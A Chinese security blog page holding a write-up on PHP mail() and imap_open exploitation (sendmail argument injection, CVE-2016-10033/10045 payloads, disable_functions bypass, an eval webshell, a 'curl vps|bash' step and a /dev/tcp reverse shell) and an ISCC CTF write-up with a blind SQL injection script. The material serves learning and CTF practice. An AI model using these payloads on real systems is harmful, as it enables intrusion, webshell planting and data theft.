
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>离怀秋</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="离怀秋">
<meta property="og:url" content="http://yoursite.com/page/7/index.html">
<meta property="og:site_name" content="离怀秋">
<meta property="article:author" content="离怀秋">
<meta name="twitter:card" content="summary">
  
    <link rel="alternative" href="/atom.xml" title="离怀秋" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
<link rel="stylesheet" href="/css/style.css">

  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
  
<meta name="generator" content="Hexo 4.2.1"></head>
<body>
<div id="container">
  <div id="wrap">
    <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">离怀秋</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">心未死 战未败</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
          <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="Search">
          <input type="submit" value="" class="search-form-submit">
          <input name=tn type=hidden value="bds">
          <input name=cl type=hidden value="3">
          <input name=ct type=hidden value="2097152">
          <input type="hidden" name="si" value="yoursite.com">
        </form>
      </div>
    </div>
  </div>
</header>
    <div class="outer">
      <section id="main">
  
    <article id="post-PHP邮件漏洞小结" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/06/01/PHP%E9%82%AE%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/" class="article-date">
  <time datetime="2019-06-01T08:58:07.000Z" itemprop="datePublished">2019-06-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/06/01/PHP%E9%82%AE%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/">PHP邮件漏洞小结</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>本文首发于安恒讲武堂。</p>
<h2 id="PHP-mail-函数介绍"><a href="#PHP-mail-函数介绍" class="headerlink" title="PHP mail()函数介绍"></a><strong>PHP mail()函数介绍</strong></h2><p><img src="https://ask.qcloudimg.com/http-save/5426480/tryesk5twn.jpeg?imageView2/2/w/1620" alt="img"></p>
<h2 id="PHP-mail-函数利用姿势"><a href="#PHP-mail-函数利用姿势" class="headerlink" title="PHP mail()函数利用姿势"></a><strong>PHP mail()函数利用姿势</strong></h2><p>PHP中，mail的函数在底层是写好的，调用linux的sendmail程序来发送邮件，在额外参数中，sendmail还支持其他三个选项。</p>
<p>-X logfile ：指定一个文件来记录邮件发送的详细日志。</p>
<p>-C file：临时加载一个配置文件(<strong>可以读文件</strong>)。</p>
<p>-O option=value ：临时设置一个邮件储存的临时位置。</p>
<p><strong>任意文件写入</strong></p>
<p>代码如下:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php$to = <span class="string">'a@b.c'</span>;$subject = <span class="string">'&lt;?php system("whoami"); ?&gt;'</span>;$message = <span class="string">'&lt;?php system("ls");?&gt;'</span>;$headers = <span class="string">''</span>;$options = <span class="string">'-f lihuaiqiu@1 -OQueueDirectory=/tmp/ -X/root/1.php'</span>;mail($to, $subject, $message, $headers, $options);?&gt;</span><br></pre></td></tr></table></figure>

<p>实际运行命令为： <code>/usr/bin/sendmail-t-i-f lihuaiqiu@1-OQueueDirectory=/tmp/-X/root/1.php</code></p>
<p>此命令简写形式 <code>-f lihuaiqiu@1-oQ/tmp/-X/root/1.php</code>可突破某些字符限制的地方。</p>
<p>查看并运行邮件日志1.php回显:</p>
<p><img src="https://ask.qcloudimg.com/http-save/5426480/o8zseonz16.jpeg?imageView2/2/w/1620" alt="img"></p>
<p>成功将邮件内容写入日志,并进行了命令执行。</p>
<p><strong>任意文件读取</strong></p>
<p>代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php$to = <span class="string">'a@b.c'</span>;$subject = <span class="string">'&lt;?php system("whoami"); ?&gt;'</span>;$message = <span class="string">'&lt;?php system("ls");?&gt;'</span>;$headers = <span class="string">''</span>;$options = <span class="string">'-f lihuaiqiu@1 -C/etc/passwd -X/root/1.php'</span>;mail($to, $subject, $message, $headers, $options);?&gt;</span><br></pre></td></tr></table></figure>

<p>实际运行命令: <code>/usr/bin/sendmail-t-i-f lihuaiqiu@1-C/etc/passwd-X/root/1.php</code></p>
<p>回显效果：</p>
<p><img src="https://ask.qcloudimg.com/http-save/5426480/1qqr8072a8.jpeg?imageView2/2/w/1620" alt="img"></p>
<p>成功读取敏感数据文件。</p>
<p><strong>利用配置文件执行代码</strong></p>
<p>上述两种情况只建立在我们的目录有写权限以及写入的文件可以执行条件下，但是如果我们面临着没有写权限或者无法执行写入文件该怎么办呢，这时就要用到新的姿势，利用配置文件执行代码。</p>
<p>找到一个上传点，上传一个静态文件，文件内容为sendmail的配置文件内容并在末尾加上如下代码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Mlocal,              P=<span class="regexp">/usr/</span>bin/php, F=lsDFMAw5:<span class="regexp">/|@qPn9S, S=EnvFromL/</span>HdrFromL,</span><br><span class="line">R=EnvToL/HdrToL,</span><br><span class="line">T=DNS/RFC822/X-Unix,</span><br><span class="line">A=php -- $u $h $&#123;client_addr&#125;</span><br></pre></td></tr></table></figure>

<p><strong>原理:系统默认使用sendmail-mta来解析邮件的内容，这里添加的内容目的是覆盖默认的解析，使用PHP来解析邮件内容。</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload为 lihuaiqiu@<span class="number">1</span> -oQ/tmp -X ./upload/sendmail_cf</span><br></pre></td></tr></table></figure>

<p>实际执行的命令： <code>/usr/bin/sendmail-t-i-f lihuaiqiu@1-oQ/tmp-X./upload/sendmail_cf</code></p>
<p><strong>将邮件内容以php方式进行解析进行命令执行。</strong></p>
<h2 id="CVE-2016-10033分析"><a href="#CVE-2016-10033分析" class="headerlink" title="CVE-2016-10033分析"></a>CVE-2016-10033分析</h2><p>上面我们分析了PHP中mail函数产生的漏洞,而这个cve phpmailer正是因为第五个参数过滤的不严谨导致的漏洞,下面开始进行分析，代码在<a href="https://github.com/opsxcq/exploit-CVE-2016-10033/blob/master/src/class.phpmailer.php" target="_blank" rel="noopener">https://github.com/opsxcq/exploit-CVE-2016-10033/blob/master/src/class.phpmailer.php</a></p>
<p><img src="https://ask.qcloudimg.com/http-save/5426480/cucu3a9o0r.jpeg?imageView2/2/w/1620" alt="img"></p>
<p>首先定位找到mail函数,需要满足三个条件，才可以进行五个参数的mail函数执行,需满足：<strong>没有开启safe_mode模式以及$params非Null</strong>。</p>
<p>然后在接下来的代码寻找$params这个值是怎么来的</p>
<p><img src="https://ask.qcloudimg.com/http-save/5426480/c97ghqguqh.jpeg?imageView2/2/w/1620" alt="img"></p>
<p>很明显可以看到$params来自于$this-&gt;Sender，并且在下面的执行语句中，$params变量会传递进mailPassthru函数中进而给mail函数当作第五个参数。</p>
<p>接着跟进$this-&gt;sender</p>
<p><img src="https://ask.qcloudimg.com/http-save/5426480/ih4s6yn97f.jpeg?imageView2/2/w/1620" alt="img"></p>
<p>可以从函数中看出来，<strong>$address经过strpos函数以及validataAddress的检测，最终把值赋给$this-&gt;sender</strong>。</p>
<p>跟进validataAddress函数</p>
<p><img src="https://ask.qcloudimg.com/http-save/5426480/ev2zm10o5c.jpeg?imageView2/2/w/1620" alt="img"></p>
<p>可以看到依然用了strpos进行了一次检测，接着向下走会看到如果<strong>PHP_VERSION&lt;5.2的话</strong>，则选择noregex模式对$address进行检测</p>
<p><img src="https://ask.qcloudimg.com/http-save/5426480/r78d9ge9wi.jpeg?imageView2/2/w/1620" alt="img"></p>
<p>这是一个很鸡肋的检测，基本上payload中含有@就可以的。</p>
<p>最终构造exp: <code>lihuaiqiu@1-oQ/tmp-X/var/www/backdoor.php</code>，最终将日志文件写入backdoor.php中。</p>
<p>漏洞环境<a href="https://github.com/opsxcq/exploit-CVE-2016-10033" target="_blank" rel="noopener">https://github.com/opsxcq/exploit-CVE-2016-10033</a></p>
<p>漏洞利用条件</p>
<p><strong>php version &lt; 5.2.0</strong> <strong>no pcre</strong> <strong>phpmailer &lt; 5.2.18</strong> <strong>php safe_mode = false</strong></p>
<p>exp回显截图</p>
<p><img src="https://ask.qcloudimg.com/http-save/5426480/une987b3fb.jpeg?imageView2/2/w/1620" alt="img"></p>
<h2 id="Bypass-pcre8"><a href="#Bypass-pcre8" class="headerlink" title="Bypass pcre8"></a>Bypass pcre8</h2><p><img src="https://ask.qcloudimg.com/http-save/5426480/7qbsn6y04g.jpeg?imageView2/2/w/1620" alt="img"></p>
<p>如果能bypass掉这个恶心的正则，那么利用条件就方便了很多，可以发现在@前面加括号就会可以进行bypass payload为 <code>a(-X/home/www/backdoor.php-OQueueDirectory=/tmp)@qq.com</code></p>
<h4 id="CVE-2016-10045分析"><a href="#CVE-2016-10045分析" class="headerlink" title="CVE-2016-10045分析"></a>CVE-2016-10045分析</h4><p><img src="https://ask.qcloudimg.com/http-save/5426480/c2js2jmmdq.jpeg?imageView2/2/w/1620" alt="img"></p>
<p>主要更新点在于对于$this-&gt;Sender的函数过滤问题，下面来看一下这个函数的具体情况</p>
<p><img src="https://ask.qcloudimg.com/http-save/5426480/qr993d2moo.jpeg?imageView2/2/w/1620" alt="img"></p>
<p>其作用我放张图基本就会懂的</p>
<p>对于代码</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php$str=<span class="string">"a'( -X/home/www/backdoor.php -OQueueDirectory=/tmp )@qq.com"</span>;$c=escapeshellarg($str);echo $c;echo <span class="string">"&lt;/br&gt;"</span>;$str=<span class="string">"a( -X/home/www/backdoor.php -OQueueDirectory=/tmp )@qq.com"</span>;$b=escapeshellarg($str);echo $b;</span><br></pre></td></tr></table></figure>

<p>运行结果为</p>
<p>‘a’&#39;‘( -X/home/www/backdoor.php -OQueueDirectory=/tmp )@qq.com’</p>
<p>‘a( -X/home/www/backdoor.php -OQueueDirectory=/tmp )@qq.com’</p>
<p>可以看到此函数将传入的单引号进行了一次转义，并且自己为其他两端字符串添加了单引号，保证两端字符串正确解析.</p>
<p><strong>但是此时出现了问题,mail函数自带escapeshellcmd函数过滤</strong></p>
<p><img src="https://ask.qcloudimg.com/http-save/5426480/p2zj9db29o.jpeg?imageView2/2/w/1620" alt="img"></p>
<p>对于这个函数，我们的上一个payload就会失效的 <code>a(-X/home/www/backdoor.php-OQueueDirectory=/tmp)@qq.com</code>，原因在于<strong>()</strong>被转义。</p>
<h2 id="escapeshellcmd与escapeshellarg导致参数注入"><a href="#escapeshellcmd与escapeshellarg导致参数注入" class="headerlink" title="escapeshellcmd与escapeshellarg导致参数注入"></a>escapeshellcmd与escapeshellarg导致参数注入</h2><p>当$this-&gt;sender同时被这两个参数处理的话，就会导致单引号逃逸，如下代码测试</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php$str=<span class="string">"a'( -X/home/www/backdoor.php -OQueueDirectory=/tmp )@qq.com"</span>;$c=escapeshellarg($str);echo $c;</span><br><span class="line">echo escapeshellcmd($c);</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<p>‘a’&#39;‘( -X/home/www/backdoor.php -OQueueDirectory=/tmp )@qq.com’</p>
<p>‘a’&#39;‘( -X/home/www/backdoor.php -OQueueDirectory=/tmp )@qq.com&#39;</p>
<p>最终sendmail形式为 <code>-fa\(</code> , <code>-X/home/www/backdoor.php</code> , <code>-OQueueDirectory=/tmp</code> , <code>)@qq.com&#39;</code></p>
<p>本地测试代码:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php$to = <span class="string">'a@b.c'</span>;$subject = <span class="string">'&lt;?php system("whoami"); ?&gt;'</span>;$message = <span class="string">'&lt;?php system("ls");?&gt;'</span>;$headers = <span class="string">''</span>;$options = <span class="string">"'-fa'\\''\( -OQueueDirectory=/tmp -X/root/lihuaiqiu.php \)@a.com\'"</span>;</span><br><span class="line">mail($to, $subject, $message, $headers, $options);?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://ask.qcloudimg.com/http-save/5426480/83zujvj2rn.jpeg?imageView2/2/w/1620" alt="img"></p>
<p>测试结果：</p>
<p>运行的时候会有一些报错的，但是仍然可以写入文件。</p>
<h2 id="imap-open-RCE-分析"><a href="#imap-open-RCE-分析" class="headerlink" title="imap_open RCE 分析"></a><strong>imap_open RCE 分析</strong></h2><p>imapopen为介绍的第二种漏洞，imapopen同样也常用于在php中<strong>bypass disable_functions</strong>。</p>
<h3 id="IMAP介绍"><a href="#IMAP介绍" class="headerlink" title="IMAP介绍"></a><strong>IMAP介绍</strong></h3><p>Internet消息访问协议(IMAP)是电子邮件客户端用于通过TCP/IP连接从邮件服务器检索电子邮件的Internet标准协议，IMAP服务器通常侦听端口号143，在php函数中，imap_open正用于打开邮箱的IMAP流。</p>
<p>函数介绍如下：</p>
<p><img src="https://ask.qcloudimg.com/http-save/5426480/myicbnpswj.jpeg?imageView2/2/w/1620" alt="img"></p>
<p>mailbox参数详解：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;[host]&#125;:[port][flags]&#125;[mailbox_name]</span><br></pre></td></tr></table></figure>

<ul>
<li>host：标准主机(服务器的域名或者IP地址)</li>
<li>port：主机端口</li>
<li>flags：可选标志</li>
<li>mailbox_name：远程邮箱名称，默认为INBOX</li>
</ul>
<p>flags可选标志列表如下： </p>
<p><img src="https://ask.qcloudimg.com/http-save/5426480/i2fhoomnie.jpeg?imageView2/2/w/1620" alt="img"></p>
<p>具体链接：<a href="https://www.php.net/manual/zh/function.imap-open.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.imap-open.php</a></p>
<h3 id="漏洞主要触发原理"><a href="#漏洞主要触发原理" class="headerlink" title="漏洞主要触发原理:"></a>漏洞主要触发原理:</h3><p>如下实例：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@imap_open（<span class="string">'&#123;localhost&#125;：143 / imap&#125; INBOX'</span>，<span class="string">''</span>，<span class="string">''</span>）;</span><br></pre></td></tr></table></figure>

<p>分析：localhost为我们执行命令的参数之一，所以我们可以操纵服务器参数来构造恶意IMAP服务器来执行我们想要的命令，<strong>原理为：在php.ini中imap.enableinsecurersh参数为On的情况下</strong>,<strong>执行imap_open函数时/usr/bin/rsh被链接到ssh指令，所以通过ssh的-o选项我们可以进行命令执行</strong>。这里我们可以看一下ssh中可以执行命令的参数：</p>
<p><img src="https://ask.qcloudimg.com/http-save/5426480/87fuqh61re.jpeg?imageView2/2/w/1620" alt="img"></p>
<p>通过这个参数，我们就可以执行我们想要的命令了。</p>
<p>例如官方exp中给出的命令</p>
<p>ssh -oProxyCommand =”echo hello | tee / tmp / executed”localhost</p>
<p><img src="https://ask.qcloudimg.com/http-save/5426480/9md0tflbky.jpeg?imageView2/2/w/1620" alt="img"></p>
<p>通过我做的两个实验的例子，可以很清晰的看出构造出来的恶意邮箱服务器参数所造成的危害。</p>
<p>但是在PHP中填写邮箱参数的时候却不能这么直白的将此恶意邮箱参数填写</p>
<p><strong>因为在解析的时候，PHP会将空格解释为分隔符以及斜杠作为标志，这里空格还是比较好绕过的，利用$IFS shell变量以及\t都可以进行替换空格，绕过斜杠的方法则是用base64进行编码。</strong></p>
<p>如：echo bHM=|base64 -d|bash等于与ls。</p>
<h3 id="docker中模拟测试"><a href="#docker中模拟测试" class="headerlink" title="docker中模拟测试"></a>docker中模拟测试</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker pull fedosov/docker-php-imap-composer</span><br><span class="line">docker run -i -t -d fedosov/docker-php-imap-composer /bin/bash</span><br><span class="line">docker exec -it <span class="number">9017603</span>a0e13 /bin/bash</span><br></pre></td></tr></table></figure>

<p>模拟一个imap的邮件发送脚本，脚本代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php$payload = <span class="string">"echo lihuaiqiu|tee /tmp/success"</span>;$encoded_payload = base64_encode($payload);$server = <span class="string">"any -o ProxyCommand=echo\t"</span>.$encoded_payload.<span class="string">"|base64\t-d|bash"</span>;@imap_open(<span class="string">'&#123;'</span>.$server.<span class="string">'&#125;:143/imap&#125;INBOX'</span>, <span class="string">''</span>, <span class="string">''</span>);</span><br></pre></td></tr></table></figure>

<p>运行回显如下：</p>
<p><img src="https://ask.qcloudimg.com/http-save/5426480/nb9t3kbucc.jpeg?imageView2/2/w/1620" alt="img"></p>
<p>我们通过构造恶意服务器参数，成功的建立了我们想要的文件，通过此功能我们可以写webshell达到我们想要目的。</p>
<h3 id="Bypass-disable-functions"><a href="#Bypass-disable-functions" class="headerlink" title="Bypass disable_functions"></a><strong>Bypass disable_functions</strong></h3><p>理解了这个漏洞的原理，我们就能知道这个功能是可以bypass disable_functions的。</p>
<p>下面来具体分析一下：</p>
<p>在存在RFI或LFI的情况下：</p>
<p>我们通过imap_open建立一个内容为\的1.php</p>
<p>运行脚本如下</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php$server = <span class="string">"any -o ProxyCommand=echo\t'\&lt;?php\tsystem(whoami);?&gt;'\t&gt;\t1.php"</span>;@imap_open(<span class="string">'&#123;'</span>.$server.<span class="string">'&#125;:143/imap&#125;INBOX'</span>, <span class="string">''</span>, <span class="string">''</span>);</span><br></pre></td></tr></table></figure>

<p>存在RFI漏洞文件：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include($file);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>我们可以控制$file参数为我们刚才设置的1.php</p>
<p>回显结果：</p>
<p><img src="https://ask.qcloudimg.com/http-save/5426480/39443ngokr.jpeg?imageView2/2/w/1620" alt="img"></p>
<h3 id="安恒二月赛场景分析"><a href="#安恒二月赛场景分析" class="headerlink" title="安恒二月赛场景分析"></a><strong>安恒二月赛场景分析</strong></h3><p>由于没有环境，只能分析一下关键部分的思路</p>
<p>本题同样为imap_open所产生的漏洞.关键部分的在于对base64以及|的过滤，但是这个是存在上传图片的地方，所以我们可以通过bash+图片名来执行我们想要的命令</p>
<p>本地代码复现:</p>
<p>运行脚本如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php$server = <span class="string">"any -o ProxyCommand=bash\t1.jpg"</span>;@imap_open(<span class="string">'&#123;'</span>.$server.<span class="string">'&#125;:143/imap&#125;INBOX'</span>, <span class="string">''</span>, <span class="string">''</span>);</span><br></pre></td></tr></table></figure>

<p>1.jpg内容为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo&quot;&lt;?php @eval($_POST[&#39;li&#39;]);?&gt;&quot;&gt;webshell.php</span><br></pre></td></tr></table></figure>

<p>回显结果：</p>
<p><img src="https://ask.qcloudimg.com/http-save/5426480/vcfnmspuo2.jpeg?imageView2/2/w/1620" alt="img"></p>
<p>成功的打出webshell.</p>
<p><strong>另一个思考：</strong></p>
<p>如果这道题没有上传文件的助攻该怎么办？</p>
<p>其实在上面我们可以看见，这个是有建立文件的功能的，所以我们可以根据hitcon的一道题的思路：</p>
<p>先建立我们所需要的文件名，比如文件名最后需要的是 <code>curl your_vps|bash</code>，在文件的index.html中写入反弹bash的一句话：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; <span class="regexp">/dev/</span>tcp/vps/port <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>通过建立如下文件名</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'\&gt;sh\ '</span></span><br><span class="line"><span class="string">'&gt;ba\\\\\'</span></span><br><span class="line"><span class="string">'</span>&gt;\\\|\\\\<span class="string">'</span></span><br><span class="line"><span class="string">中间省略一些建立ip的过程</span></span><br><span class="line"><span class="string">'</span>&gt;rl\\\\<span class="string">'</span></span><br><span class="line"><span class="string">'</span>&gt;cu\\\\<span class="string">'</span></span><br></pre></td></tr></table></figure>

<p>最后通过命令ls -t&gt;g将文件名导入g中，执行命令sh g，最终反弹shell。</p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/06/01/PHP%E9%82%AE%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/" data-id="ckabsu38f001okkvr2vkjdrnb" class="article-share-link" data-share="baidu" data-title="PHP邮件漏洞小结">Share</a>
      

      
        <a href="http://yoursite.com/2019/06/01/PHP%E9%82%AE%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-ISCC2019部分wp" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/06/01/ISCC2019%E9%83%A8%E5%88%86wp/" class="article-date">
  <time datetime="2019-06-01T08:55:39.000Z" itemprop="datePublished">2019-06-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/06/01/ISCC2019%E9%83%A8%E5%88%86wp/">ISCC2019部分wp</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>前言</p>
<p>本来是想好好写一篇ISCC的wp的，但是最近接近期末，还有好多事要做，(也主要是ISCC的题很水，所以我只写了一个自己感觉在题里面还算可以的题</p>
<h3 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h3><p><strong>知识点: UA头伪造，order by盲注</strong></p>
<p>题目链接：<a href="http://39.100.83.188:8054/" target="_blank" rel="noopener">http://39.100.83.188:8054/</a></p>
<p>进入题目页面</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3gvv93dkhj30zy0n0weu.jpg" alt=""></p>
<p>首先进行UA头伪造：<code>User-Agent:lihuaiqiu Union.373</code>,回显<strong>请输入用户名</strong>，在post中添加<code>username=lihuaiqiu</code>,回显<strong>请输入密码</strong>,随意在password字段中添加值，发现回显:<strong>成员密码即为flag</strong></p>
<p><strong>构造注入语句，爆出所有用户名</strong></p>
<p>看到传过去的为username和password，猜测后台语句应该为<code>select * from table_name where username=&#39;xx&#39; and password=&#39;xxx&#39;</code>，构造一下注入(<strong>过滤掉了很多字符注释符和一些关键字如and都被过滤了</strong></p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3gx18x1zkj31hc0j03zt.jpg" alt=""></p>
<p>爆出用户名为<code>union_373_Tom!</code>。</p>
<p>爆一下字段数</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3gx8afo80j31hc0lpwfu.jpg" alt=""></p>
<p>发现字段回显为2，接下来开始<code>order盲注</code>(由于过滤了括号以及and,like,regexp等关键词)：</p>
<p>首先介绍一下order by 盲注:</p>
<ul>
<li><strong>order排序方法默认为升序，也就是字典序(字母序)小的在上面</strong></li>
<li><strong>order by num –&gt;对第几列进行排序</strong></li>
</ul>
<p>贴一下这个对比图，就会很容易明白的</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3gxkfjiljj30wr0cljz7.jpg" alt=""></p>
<p>填入k和m的十六进制，当字母的字典序小于f，则该字母在第一列，回显的也就是测试字符对应的字段，所以是<strong>欢迎2</strong>;当字母的字典序大于f，则flag对应的行位于第一行,所以回显的是<strong>欢迎union_373_Tom</strong>，所以我们可以构造脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">'http://39.100.83.188:8054/'</span></span><br><span class="line">headers=&#123;<span class="string">"User-Agent"</span>:<span class="string">"lihuaiqiu Union.373"</span>&#125;</span><br><span class="line">payload=<span class="string">"union_373_Tom' union select 1,2,0x&#123;&#125; order by 3,2,'1"</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">        data=&#123;<span class="string">"username"</span>:payload.format((flag+chr(j)).encode(<span class="string">'hex'</span>)),<span class="string">"password"</span>:<span class="string">'233'</span>&#125;</span><br><span class="line">        lihuaiqiu=requests.post(url,headers=headers,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"union_373_Tom"</span> <span class="keyword">in</span> lihuaiqiu.text:</span><br><span class="line">            flag+=chr(j<span class="number">-1</span>)</span><br><span class="line">            <span class="keyword">print</span> flag</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3gxrah6puj314a0lqtas.jpg" alt=""></p>
<p>最后得到flag.</p>
<p>这里自己在写脚本的时候遇到了一个小坑点，我第一次写的时候直接<code>union_373_Tom&#39; union select 1,2,0x{} order by &#39;3</code>这么写不会跑出正确结果的原因在于并没有考虑到两者字典序等于的情况，在有<code>order by 3,&#39;2&#39;</code>的情况下，会对此情况进行处理，<strong>如果两者字典序相同，则会去order第二列，第二列的话肯定是我们union进去的2比较小，所以返回的不是正确所对的ascii值，正好符合我们的构造逻辑</strong></p>
<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>后来在看WP(赵师傅的)的时候发现了<strong>另一种比较有趣的姿势</strong>，利用<strong>内联注释符</strong></p>
<p>构造代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from table_name where user&#x3D;&#39;11&#39; and password&#x3D;&#39;22&#39;</span><br><span class="line">select * from table_name where user&#x3D;&#39;11&#39; union select 1,2,3&#x2F;*&#39;and password&#x3D;&#39;*&#x2F;&#39;&#39;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3jlzcqphdj30mz076772.jpg" alt=""></p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/06/01/ISCC2019%E9%83%A8%E5%88%86wp/" data-id="ckabsu3860016kkvr2r8i7pq4" class="article-share-link" data-share="baidu" data-title="ISCC2019部分wp">Share</a>
      

      
        <a href="http://yoursite.com/2019/06/01/ISCC2019%E9%83%A8%E5%88%86wp/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Padding-oracle-attack与CBC字节翻转攻击的邂逅" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/06/01/Padding-oracle-attack%E4%B8%8ECBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB%E7%9A%84%E9%82%82%E9%80%85/" class="article-date">
  <time datetime="2019-06-01T08:51:59.000Z" itemprop="datePublished">2019-06-01</time>
